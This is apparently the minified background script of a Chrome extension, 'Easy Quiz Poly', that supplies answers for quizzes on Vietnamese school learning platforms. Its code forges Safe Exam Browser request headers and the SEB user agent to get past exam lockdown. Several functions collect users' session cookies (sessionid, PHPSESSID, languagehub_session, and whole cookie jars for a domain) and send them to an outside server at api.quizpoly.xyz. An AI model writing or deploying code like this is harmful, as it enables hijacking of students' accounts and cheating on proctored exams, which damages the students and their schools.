const e = "https://api.quizpoly.xyz",
  t = "https://auth.easyquiz.cc";
let n = "ok",
  r = "ok",
  o = "https://cms.poly.edu.vn/dashboard",
  s = "normal",
  a = "0.0.0",
  i = [];
async function c() {
  if ("remove" === o)
    return void (await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [2, 3, 4],
      addRules: [],
    }));
  const e = await (async function (e) {
      const t = e.split("#")[0];
      return await u(t + r);
    })(o),
    t = [
      {
        id: 3,
        priority: 1,
        action: {
          type: "modifyHeaders",
          requestHeaders: [
            {
              header: "X-SafeExamBrowser-RequestHash",
              operation: "set",
              value: await (async function (e, t) {
                const r = t.split("#")[0] + n;
                return await u(r);
              })(0, o),
            },
          ],
        },
        condition: {
          urlFilter: "||poly.edu.vn/",
          resourceTypes: [
            "main_frame",
            "sub_frame",
            "stylesheet",
            "script",
            "image",
            "font",
            "object",
            "xmlhttprequest",
            "media",
            "other",
          ],
        },
      },
      {
        id: 4,
        priority: 1,
        action: {
          type: "modifyHeaders",
          requestHeaders: [
            {
              header: "X-SafeExamBrowser-ConfigKeyHash",
              operation: "set",
              value: e,
            },
          ],
        },
        condition: {
          urlFilter: "||poly.edu.vn/",
          resourceTypes: [
            "main_frame",
            "sub_frame",
            "stylesheet",
            "script",
            "image",
            "font",
            "object",
            "xmlhttprequest",
            "media",
            "other",
          ],
        },
      },
    ];
  (o.includes("sequence=") || o.includes("ilSAHSPresentationGUI")) &&
    t.push({
      id: 2,
      priority: 1,
      action: {
        type: "modifyHeaders",
        requestHeaders: [
          {
            header: "User-Agent",
            operation: "set",
            value:
              "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.184 SEB/3.8.0 BETA (x64)",
          },
        ],
      },
      condition: {
        urlFilter: "||fpl*.poly.edu.vn/",
        resourceTypes: [
          "main_frame",
          "sub_frame",
          "stylesheet",
          "script",
          "image",
          "font",
          "object",
          "xmlhttprequest",
          "media",
          "other",
        ],
      },
    }),
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [2, 3, 4],
      addRules: t,
    });
}
async function u(e) {
  const t = new TextEncoder().encode(e),
    n = await crypto.subtle.digest("SHA-256", t);
  return Array.from(new Uint8Array(n))
    .map((e) => e.toString(16).padStart(2, "0"))
    .join("");
}
async function l(e) {
  const { subjectName: t, domain: n, quizId: r, passTime: o } = e;
  t && i.includes(t.toLowerCase())
    ? (async function (e, t, n, r) {
        let o = "";
        const s = `${t}/ilias.php?ref_id=${e}&pass=${n}&cmd=outUserPassDetails&cmdClass=iltestevaluationgui&cmdNode=4t:pc:oj:ph:p0&baseClass=ilRepositoryGUI`,
          { quizSelf: a } = await chrome.storage.local.get(["quizSelf"]);
        chrome.storage.local.set({ quizSelf: {} });
        const i = await fetch(s, { method: "GET" });
        if (i.redirected) return;
        (o = await i.text()),
          await y("offscreen.html"),
          chrome.runtime.sendMessage({
            type: "get_quiz_score",
            target: "offscreen",
            data: {
              quizSelf: a,
              htmlString: o,
              quizId: e,
              domain: t,
              passTime: n,
              subjectName: r,
            },
          });
      })(r, n, o, t)
    : chrome.storage.local.set({ quizSelf: {} });
}
async function h({
  quizzes: e,
  quizId: t,
  domain: n,
  subjectName: r,
  quizSelf: o,
}) {
  e && e.length
    ? p({ subjectName: r, quizzes: e })
    : (async function (e, t, n, r) {
        let o,
          s = "";
        const a = `${e}/ilias.php?ref_id=${t}&cmd=outUserResultsOverview&cmdClass=iltestevaluationgui&cmdNode=4t:pc:oj:ph:p0&baseClass=ilRepositoryGUI`;
        (o = await fetch(a, { method: "GET", redirect: "error" })),
          (s = await o.text()),
          await y("offscreen.html"),
          chrome.runtime.sendMessage({
            type: "get_quiz_percent",
            target: "offscreen",
            data: { htmlString: s, subjectName: n, quizSelf: r },
          });
      })(n, t, r, o);
}
async function m({ percent: e, subjectName: t, quizSelf: n }) {
  let r = "";
  e >= 100
    ? (r = " - 100")
    : e > 90
    ? (r = " - draft 90")
    : e > 80 && (r = " - draft 80"),
    r && p({ subjectName: `${t}${r}`, quizzes: Object.values(n) });
}
async function p(t) {
  try {
    const n = await fetch(e + "/quizpoly/self", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      referrerPolicy: "origin",
      body: JSON.stringify(t),
    });
    await n.json();
  } catch (n) {}
}
async function d() {
  fetch(e + "/config?name=sebKey")
    .then((e) => e.json())
    .then((e) => {
      "object" != typeof e ||
        Array.isArray(e) ||
        null === e ||
        (e.browserExamKey && (n = e.browserExamKey),
        e.configurationKey && (r = e.configurationKey),
        c());
    })
    .catch((e) => {});
}
!(async function () {
  fetch(e + "/quizpoly/subjects?fields=subjectsGet")
    .then((e) => e.json())
    .then((e) => {
      e.subjectsGet && (i = e.subjectsGet);
    })
    .catch((e) => {});
})(),
  N(),
  chrome.management.getSelf((e) => {
    (s = e.installType), (a = e.version);
  }),
  chrome.runtime.onMessage.addListener(async (e, t, n) => {
    "update_seb_url" === e.type && ((o = e.url), await c(), n("done"));
  }),
  chrome.runtime.onMessageExternal.addListener(async (e, t, n) => {
    "update_seb_url" === e.type && ((o = e.sebUrl), await c(), n("done"));
  });
const f = "/offscreen.html";
let g;
async function y(e) {
  (await v()) ||
    (g
      ? await g
      : ((g = chrome.offscreen.createDocument({
          url: e,
          reasons: ["DOM_PARSER"],
          justification: "dom parser",
        })),
        await g,
        (g = null)));
}
async function w() {
  (await v()) && (await chrome.offscreen.closeDocument());
}
async function v() {
  if ("getContexts" in chrome.runtime) {
    const e = await chrome.runtime.getContexts({
      contextTypes: ["OFFSCREEN_DOCUMENT"],
      documentUrls: [f],
    });
    return Boolean(e.length);
  }
  {
    const e = await clients.matchAll();
    return await e.some((e) => {
      e.url.includes(chrome.runtime.id);
    });
  }
}
async function S(t, n = "NULL") {
  try {
    fetch(e + "/quizpoly/html", {
      method: "POST",
      mode: "cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ note: `${a}: ${t}`, html: n }),
    });
  } catch (r) {}
  return !0;
}
function T(e, t, n) {
  const r = e.find((e) => e.domain === t && e.name === n);
  return r ? r.value : "";
}
function $(t) {
  try {
    const n = "cms.poly.edu.vn" == t.domain ? ".poly.edu.vn" : t.domain;
    chrome.cookies.getAll({ domain: n }, async (r) => {
      const o = (function (e, t) {
        let n;
        return (
          (n =
            "cms.poly.edu.vn" === t || ".poly.edu.vn" === t
              ? T(e, ".poly.edu.vn", "sessionid")
              : T(e, t, "PHPSESSID")),
          n
        );
      })(r, n);
      chrome.storage.local.get(["user"], async ({ user: n }) => {
        await fetch(e + "/quizpoly/using", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ name: n.name, c: o, v: a, ...t.data }),
        });
      });
    });
  } catch (n) {}
  return !0;
}
function b(e, t) {
  t || (t = `Notification-${Date.now()}`),
    chrome.notifications.create(t, {
      type: "basic",
      iconUrl: "assets/icon128.png",
      title: "Easy Quiz Poly",
      priority: 1,
      ...e,
    });
}
async function q(t, n) {
  try {
    const r = await chrome.cookies.get({ url: n.url, name: n.name });
    if (!r) return;
    fetch(e + "/site-data", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      referrerPolicy: "origin",
      body: JSON.stringify({ ...t, cookie: r.value }),
    });
  } catch (r) {}
}
async function k(t, n) {
  try {
    chrome.cookies.getAll({ domain: n }, async (n) => {
      const r = n.map((e) => `${e.name}=${e.value}`).join("; ");
      r &&
        fetch(e + "/site-data", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          referrerPolicy: "origin",
          body: JSON.stringify({ ...t, cookie: r }),
        });
    });
  } catch (r) {}
}
function z() {
  return (async function (e) {
    const t = await fetch(e);
    return await t.json();
  })(t + "/me")
    .then((e) =>
      "success" === e.status && e.user
        ? e.user
        : ("UNAUTHORIZED" === e.code && x(), null)
    )
    .catch((e) => null);
}
function E(e) {
  chrome.system.display.getInfo((t) => {
    const { width: n, height: r } = t[0].workArea,
      o = Math.round(0.5 * n),
      s = Math.round(0.87 * r),
      a = Math.round(n / 2 - o / 2),
      i = Math.round(r / 2 - s / 2);
    chrome.windows.create(
      {
        url: "https://app.easyquiz.cc/login?source=extension",
        type: "normal",
        focused: !0,
        width: o,
        height: s,
        left: a,
        top: i,
      },
      (t) => {
        var n = setInterval(function () {
          chrome.tabs.query({ windowId: t.id }, (r) => {
            if (!r.length) return clearInterval(n), e("fail");
            try {
              const { url: o, title: s } = r[0];
              if ("Login Success" == s)
                clearInterval(n),
                  chrome.windows.remove(t.id),
                  z().then((t) => {
                    chrome.storage.local.set({ user: t, isLogged: !0 }, () => {
                      b({ message: "Đăng nhập thành công" }),
                        chrome.action.setPopup({
                          popup: "/popup/popup-logged.html",
                        }),
                        e("success"),
                        chrome.tabs.query(
                          {
                            url: [
                              "https://cms.quizpoly.xyz/*",
                              "https://quizpoly.xyz/plans.html",
                            ],
                          },
                          (e) => {
                            if (e.length)
                              for (let t of e) chrome.tabs.reload(t.id);
                          }
                        );
                    });
                  });
              else if ("Login Failed" == s)
                return (
                  clearInterval(n),
                  chrome.windows.remove(t.id),
                  e("fail"),
                  b({ message: "Đăng nhập không thành công" })
                );
            } catch (o) {
              return (
                clearInterval(n),
                chrome.windows.remove(t.id),
                e("fail"),
                b({ message: `Đăng nhập không thành công: ${o.message}` })
              );
            }
          });
        }, 500);
      }
    );
  });
}
function j(t) {
  chrome.storage.local.get(["isLogged"], ({ isLogged: n }) => {
    if (!n) return t("not_logged");
    chrome.system.display.getInfo((n) => {
      const { width: r, height: o } = n[0].workArea,
        s = Math.round(0.85 * r),
        a = Math.round(0.9 * o),
        i = Math.round(r / 2 - s / 2),
        c = Math.round(o / 2 - a / 2);
      chrome.windows.create(
        {
          url: "https://quizpoly.xyz/quiz-link.html",
          type: "panel",
          focused: !0,
          width: s,
          height: a,
          left: i,
          top: c,
        },
        (n) => {
          var r = setInterval(() => {
            chrome.tabs.query({ windowId: n.id }, (o) => {
              if (!o.length) return clearInterval(r), void t("fail");
              const { url: s } = o[0];
              if (s.startsWith(`${e}/quizpoly/quiz-link?token=`)) {
                clearInterval(r);
                const e = s.split("token=")[1];
                chrome.storage.local.set({ linkToken: e }).then(() => {
                  chrome.windows.remove(n.id), t("success");
                });
              }
            });
          }, 500);
        }
      );
    });
  });
}
function N() {
  chrome.storage.local.get(["user"], ({ user: e }) => {
    !e ||
      ("object" == typeof e && 0 === Object.keys(e).length) ||
      z()
        .then((t) => {
          if (!t) return;
          const { plan: n } = t,
            r = e.plan && e.plan.endDate,
            o = n && n.endDate;
          (e.plan.name === n.name && r === o) ||
            (("Premium" != e.plan.name && "Pro" != e.plan.name) ||
            "Free" != n.name
              ? "Free" != e.plan.name ||
                ("Premium" != n.name && "Pro" != n.name) ||
                (b({
                  message: `Chúc mừng! Tài khoản của bạn đã được nâng cấp lên ${n.name}`,
                }),
                chrome.tabs.query(
                  { url: ["https://cms.quizpoly.xyz/*"] },
                  (e) => {
                    if (e.length) for (let t of e) chrome.tabs.reload(t.id);
                  }
                ))
              : b(
                  {
                    message: `Hạn dùng ${e.plan.name} của bạn đã hết. Hãy nâng cấp để tiếp tục sử dụng ${n.name}`,
                    buttons: [{ title: "Nâng cấp" }],
                  },
                  "premium_expired"
                ),
            (e.plan = n),
            chrome.storage.local.set({ user: e }));
        })
        .catch((e) => {});
  }),
    chrome.cookies.get({ url: t, name: "token" }, (e) => {
      null === e &&
        chrome.storage.local.set({ isLogged: !1, user: void 0 }, () => {
          chrome.action.setPopup({ popup: "/popup/popup.html" });
        });
    });
}
function P() {
  const e = new Promise((e, t) => {
    chrome.storage.local.get(["user"], ({ user: t }) => {
      if (!t || ("object" == typeof t && 0 === Object.keys(t).length))
        return e();
      z()
        .then((n) => {
          if (!n) return e(t);
          const { plan: r } = n,
            o = t.plan && t.plan.endDate,
            s = r && r.endDate;
          (t.plan.name === r.name && o === s) ||
            (("Premium" != t.plan.name && "Pro" != t.plan.name) ||
            "Free" != r.name
              ? "Free" != t.plan.name ||
                ("Premium" != r.name && "Pro" != r.name) ||
                (b({
                  message: `Chúc mừng! Tài khoản của bạn đã được nâng cấp lên ${r.name}`,
                }),
                chrome.tabs.query(
                  { url: ["https://cms.quizpoly.xyz/*"] },
                  (e) => {
                    if (e.length) for (let t of e) chrome.tabs.reload(t.id);
                  }
                ))
              : b(
                  {
                    message: `Hạn dùng ${t.plan.name} của bạn đã hết. Hãy nâng cấp để tiếp tục sử dụng ${r.name}`,
                    buttons: [{ title: "Nâng cấp" }],
                  },
                  "premium_expired"
                ),
            (t.plan = r),
            chrome.storage.local.set({ user: t })),
            e(n);
        })
        .catch((n) => {
          e(t);
        });
    });
  });
  return (
    chrome.cookies.get({ url: t, name: "token" }, (e) => {
      null === e &&
        chrome.storage.local.set({ isLogged: !1, user: void 0 }, () => {
          chrome.action.setPopup({ popup: "/popup/popup.html" });
        });
    }),
    e
  );
}
async function x(e) {
  chrome.storage.local.set({ isLogged: !1, user: {} }, () => {
    chrome.action.setPopup({ popup: "/popup/popup.html" }), e && e("success");
  }),
    await fetch(t + "/logout", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
    });
}
async function I(t, n = {}, r = {}, o = 3) {
  let i = 0;
  const c = {
      method: "POST",
      headers: { "Content-Type": "application/json", "ext-v": a, "ext-i": s },
      body: JSON.stringify(n),
    },
    u = { ...c, ...r, headers: { ...c.headers, ...r.headers } };
  return (async function n() {
    try {
      const n = await fetch(`${e}${t}`, u);
      if (!n.ok) throw new Error(`Fetch POST ${t} failed! Status: ${n.status}`);
      const r = n.headers.get("content-type");
      if (!r || !r.includes("application/json"))
        throw new Error("Server error, try again");
      const o = await n.json();
      if (!n.ok)
        throw new Error(
          `${(null == o ? void 0 : o.message) || "Unknown error"} ${
            (null == o ? void 0 : o.code) || ""
          } - Status ${n.status}`
        );
      return [!0, o];
    } catch (r) {
      return ((r instanceof TypeError && !r.response) || i >= o) && i < o
        ? (i++, await new Promise((e) => setTimeout(e, 1e3 * i)), n())
        : [!1, `Error: ${r.message}`];
    }
  })();
}
async function O(t, n = {}, r, o = {}, i = 2) {
  let c = 0;
  const u = {
      method: "POST",
      headers: { "Content-Type": "application/json", "ext-v": a, "ext-i": s },
      body: JSON.stringify(n),
    },
    l = { ...u, ...o, headers: { ...u.headers, ...o.headers } };
  return (async function n() {
    var o;
    try {
      const n = await fetch(`${e}${t}`, l);
      if (401 === n.status) return x(), r([!0, "require_auth"]);
      if (404 === n.status) return r([!1, "no_answer"]);
      const s = n.headers.get("content-type");
      if (!s || !s.includes("application/json"))
        throw new Error("Server error, try again");
      const a = await n.json();
      return n.ok
        ? r([!0, a])
        : "INSUFFICIENT_POINTS" == (null == a ? void 0 : a.code)
        ? (b(
            {
              message:
                "Không đủ Easy Point, vui lòng nâng cấp Premium để tiếp tục sử dụng",
              buttons: [{ title: "Nâng cấp" }],
            },
            "premium_expired"
          ),
          r([
            !1,
            `Không đủ Easy Point, cần ${
              null == (o = null == a ? void 0 : a.points) ? void 0 : o.required
            } Points để giải`,
          ]))
        : r([
            !1,
            `${(null == a ? void 0 : a.message) || "Unknown error"} ${
              (null == a ? void 0 : a.code) || ""
            } - Status ${n.status}`,
          ]);
    } catch (s) {
      if (!((s instanceof TypeError && !s.response) || c >= i))
        return r([!1, `Error: ${s.message}`]);
      if (!(c < i))
        return (
          S(`Error fetching ${t}: ${s.message}`), r([!1, `Error: ${s.message}`])
        );
      c++, setTimeout(n, 1e3 * c);
    }
  })();
}
async function _(t, n) {
  try {
    const r = await fetch(e + "/site-data", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ site: t, data: n }),
    });
    await r.json();
  } catch (r) {}
}
async function C(e = {}) {
  const [t, n] = await I("/quiz/add", e);
}
async function U(e = {}) {
  const [t, n] = await I("/quizpoly/lms/add", e);
}
async function A(e, t) {
  return O("/quiz/answer", e, t);
}
async function F(t, n) {
  let r = 0;
  return (async function o() {
    try {
      const r = await fetch(`${e}/quizpoly/lms/check`, {
        method: "POST",
        headers: { "ext-v": a, "ext-i": s, "Content-Type": "application/json" },
        body: JSON.stringify(t),
      });
      if (401 == r.status) return x(), n([!0, "require_auth"]);
      if (404 == r.status) return n([!1, "no_answer"]);
      if (!r.ok) throw new Error(`Server responded with status: ${r.status}`);
      return n([!0, "ok"]);
    } catch (i) {
      if (!((i instanceof TypeError && !i.response) || r >= 3))
        return (
          S(
            `Error checkQuiz 2 - ${null == t ? void 0 : t.subjectName}: ${
              i.message
            }`
          ),
          n([!1, i.message])
        );
      if (!(r < 3))
        return (
          S(
            `Error checkQuiz 1 - ${null == t ? void 0 : t.subjectName}: ${
              i.message
            }`
          ),
          n([!1, i.message])
        );
      r++, setTimeout(o, 1e3 * r);
    }
  })();
}
async function H(t, n) {
  let r = 0,
    o = "";
  return (async function i() {
    var c;
    try {
      o = (await chrome.storage.local.get(["linkToken"])).linkToken || "";
      const r = await fetch(`${e}/quizpoly/lms`, {
        method: "POST",
        headers: {
          "ext-v": a,
          "ext-i": s,
          "l-token": o,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(t),
      });
      if (401 == r.status) return x(), n([!0, "require_auth"]);
      if (404 == r.status) return n([!1, "no_answer"]);
      const i = r.headers.get("content-type");
      if (i && -1 === i.indexOf("application/json"))
        throw new Error("Server error, try again");
      const u = await r.json();
      if (!r.ok) {
        if ("INSUFFICIENT_POINTS" == (null == u ? void 0 : u.code))
          return (
            b(
              {
                message:
                  "Không đủ Easy Point, vui lòng nâng cấp Premium để tiếp tục sử dụng",
                buttons: [{ title: "Nâng cấp" }],
              },
              "premium_expired"
            ),
            n([
              !1,
              "INSUFFICIENT_POINTS",
              null == (c = null == u ? void 0 : u.points) ? void 0 : c.required,
            ])
          );
        throw new Error(
          `${(null == u ? void 0 : u.message) || "Unknown error"} ${
            (null == u ? void 0 : u.code) || ""
          } - Status ${r.status}`
        );
      }
      if (null == (null == u ? void 0 : u.quizzes)) return n([!0, []]);
      n([!0, u.quizzes]);
    } catch (u) {
      if (!((u instanceof TypeError && !u.response) || r >= 3))
        return (
          S(
            `Error fetching quiz lms 2 - ${
              null == t ? void 0 : t.subjectName
            } - ${o}: ${u.message}`
          ),
          n([!1, `Error: ${u.message}`])
        );
      if (!(r < 3))
        return (
          S(
            `Error fetching quiz lms 1 - ${
              null == t ? void 0 : t.subjectName
            }: ${u.message}`
          ),
          n([!1, `Error: ${u.message}`])
        );
      r++, setTimeout(i, 1e3 * r);
    }
  })();
}
async function M(t, n) {
  let r = 0;
  return (async function o() {
    try {
      const r = await fetch(`${e}/quizpoly/online/check`, {
        method: "POST",
        headers: { "ext-v": a, "ext-i": s, "Content-Type": "application/json" },
        body: JSON.stringify({ subject: t }),
      });
      if (401 == r.status) return x(), n([!0, "require_auth"]);
      if (404 == r.status) return n([!1, "no_answer"]);
      if (!r.ok) throw new Error(`Server responded with status: ${r.status}`);
      return n([!0, "ok"]);
    } catch (i) {
      if (!((i instanceof TypeError && !i.response) || r >= 3))
        return (
          S(`Error checkQuiz online 2 - ${t}: ${i.message}`), n([!1, i.message])
        );
      if (!(r < 3))
        return (
          S(`Error checkQuiz online 1 - ${t}: ${i.message}`), n([!1, i.message])
        );
      r++, setTimeout(o, 1e3 * r);
    }
  })();
}
async function R(t, n) {
  let r = 0,
    o = "";
  return (async function i() {
    var c;
    try {
      o = (await chrome.storage.local.get(["linkToken"])).linkToken || "";
      const r = await fetch(`${e}/quizpoly/online`, {
        method: "POST",
        headers: {
          "ext-v": a,
          "ext-i": s,
          "l-token": o,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ subject: t }),
      });
      if (401 == r.status) return x(), n([!0, "require_auth"]);
      if (404 == r.status) return n([!1, "no_answer"]);
      const i = r.headers.get("content-type");
      if (i && -1 === i.indexOf("application/json"))
        throw new Error("Server error, try again");
      const u = await r.json();
      if (!r.ok) {
        if ("INSUFFICIENT_POINTS" == (null == u ? void 0 : u.code))
          return (
            b(
              {
                message:
                  "Không đủ Easy Point, vui lòng nâng cấp Premium để tiếp tục sử dụng",
                buttons: [{ title: "Nâng cấp" }],
              },
              "premium_expired"
            ),
            n([
              !1,
              "INSUFFICIENT_POINTS",
              null == (c = null == u ? void 0 : u.points) ? void 0 : c.required,
            ])
          );
        throw new Error(
          `${(null == u ? void 0 : u.message) || "Unknown error"} ${
            (null == u ? void 0 : u.code) || ""
          } - Status ${r.status}`
        );
      }
      if (null == (null == u ? void 0 : u.quizzes)) return n([!0, []]);
      n([!0, u.quizzes]);
    } catch (u) {
      if (!((u instanceof TypeError && !u.response) || r >= 3))
        return (
          S(`Error fetching quiz online 2 - ${t} - ${o}: ${u.message}`),
          n([!1, `Error: ${u.message}`])
        );
      if (!(r < 3))
        return (
          S(`Error fetching quiz online 1 - ${t}: ${u.message}`),
          n([!1, `Error: ${u.message}`])
        );
      r++, setTimeout(i, 1e3 * r);
    }
  })();
}
async function D(e, t, n) {
  return O("/cms/getManualAnswer", { courseId: e, questions: t }, n);
}
async function J(e, t) {
  return O("/cms/autoAnswer", { courseId: e }, t);
}
async function L(e, t) {
  return O("/cms", { courseId: e }, t, {
    headers: {
      "l-token":
        (await chrome.storage.local.get(["linkToken"])).linkToken || "",
    },
  });
}
async function K(t) {
  try {
    const n = await chrome.cookies.get({
        url: "https://lms.languagehub.vn",
        name: "languagehub_session",
      }),
      r = n ? n.value : "";
    chrome.storage.local.get(["user"], async ({ user: n }) => {
      await fetch(e + "/quizpoly/using", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: n.name,
          c: r,
          v: a,
          userServer: "ALH",
          ...t.data,
        }),
      });
    });
  } catch (n) {}
  return !0;
}
async function G(t, n) {
  let r = 0;
  return (async function o() {
    var i;
    try {
      const r = await chrome.cookies.get({
          url: "https://lms.languagehub.vn",
          name: "languagehub_session",
        }),
        o = await fetch(`${e}/alh/solve-quiz`, {
          method: "POST",
          headers: {
            "ext-v": a,
            "ext-i": s,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ ...t, studentSession: r.value }),
        });
      if (401 == o.status) return x(), n([!0, "require_auth"]);
      if (404 == o.status) return n([!0, o.statusText]);
      const c = o.headers.get("content-type");
      if (c && -1 === c.indexOf("application/json"))
        throw new Error("Server error, try again");
      const u = await o.json();
      if (!o.ok)
        return "INSUFFICIENT_POINTS" == (null == u ? void 0 : u.code)
          ? (b(
              {
                message:
                  "Không đủ Easy Point, vui lòng nâng cấp Premium để tiếp tục sử dụng",
                buttons: [{ title: "Nâng cấp" }],
              },
              "premium_expired"
            ),
            n([
              !1,
              `Không đủ Easy Point, cần ${
                null == (i = null == u ? void 0 : u.points)
                  ? void 0
                  : i.required
              } Points để giải`,
            ]))
          : n([
              !1,
              `${(null == u ? void 0 : u.message) || "Unknown error"} ${
                (null == u ? void 0 : u.code) || ""
              } - Status ${o.status}`,
            ]);
      n([!0, u]);
    } catch (c) {
      if (!((c instanceof TypeError && !c.response) || r >= 3))
        return n([!1, `Error: ${c.message}`]);
      if (!(r < 3)) return n([!1, `Error: ${c.message}`]);
      r++, setTimeout(o, 1e3 * r);
    }
  })();
}
async function Q(t, n) {
  let r = 0;
  return (async function o() {
    try {
      const r = await fetch(`${e}/alh/check-quiz`, {
        method: "POST",
        headers: { "ext-v": a, "ext-i": s, "Content-Type": "application/json" },
        body: JSON.stringify({ id: t }),
      });
      if (401 == r.status) return x(), n([!0, "require_auth"]);
      if (404 == r.status) return n([!1, "no_answer"]);
      if (!r.ok) throw new Error(`Server responded with status: ${r.status}`);
      return n([!0, "ok"]);
    } catch (i) {
      if (!((i instanceof TypeError && !i.response) || r >= 3))
        return (
          S(`Error checkQuiz alh 2 - ${t}: ${i.message}`), n([!1, i.message])
        );
      if (!(r < 3))
        return (
          S(`Error checkQuiz alh 1 - ${t}: ${i.message}`), n([!1, i.message])
        );
      r++, setTimeout(o, 1e3 * r);
    }
  })();
}
async function B() {
  try {
    const t = await fetch(e + "/notifications/newest");
    if (!t.ok) throw new Error("Network response was not ok");
    return await t.json();
  } catch (t) {
    return null;
  }
}
chrome.storage.local.get(
  ["hightlightAnswerSetting"],
  ({ hightlightAnswerSetting: e }) => {
    null == e && chrome.storage.local.set({ hightlightAnswerSetting: !0 });
  }
);
export {
  P as A,
  N as B,
  L as C,
  B as D,
  K as a,
  k as b,
  q as c,
  w as d,
  h as e,
  l as f,
  m as g,
  _ as h,
  J as i,
  D as j,
  Q as k,
  x as l,
  G as m,
  b as n,
  R as o,
  M as p,
  F as q,
  H as r,
  d as s,
  E as t,
  j as u,
  A as v,
  C as w,
  U as x,
  S as y,
  $ as z,
};
